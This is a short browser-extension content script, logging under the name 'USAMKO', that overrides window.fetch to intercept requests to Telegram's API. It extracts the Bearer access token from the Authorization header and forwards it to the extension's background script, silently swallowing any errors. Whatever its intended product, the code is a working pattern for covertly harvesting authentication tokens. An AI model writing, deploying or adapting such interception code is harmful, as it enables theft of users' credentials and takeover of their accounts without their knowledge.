/**
 * Telegram Token Capture - Content Script
 */

(function() {
  'use strict';

  console.log('USAMKO: Telegram token capture initialized');

  let tokenCaptured = false;

  const originalFetch = window.fetch;
  window.fetch = async function(...args) {
    const response = await originalFetch(...args);

    try {
      const url = args[0];
      if (typeof url === 'string' && url.includes('telegram.org/api')) {
        if (args[1]?.headers?.Authorization && !tokenCaptured) {
          const auth = args[1].headers.Authorization;
          if (auth.startsWith('Bearer ')) {
            tokenCaptured = true;

            chrome.runtime.sendMessage({
              type: 'TOKEN_CAPTURED',
              data: {
                platform: 'telegram',
                accessToken: auth.substring(7),
                accountId: null,
                metadata: {}
              }
            });
          }
        }
      }
    } catch (error) {}

    return response;
  };

})();
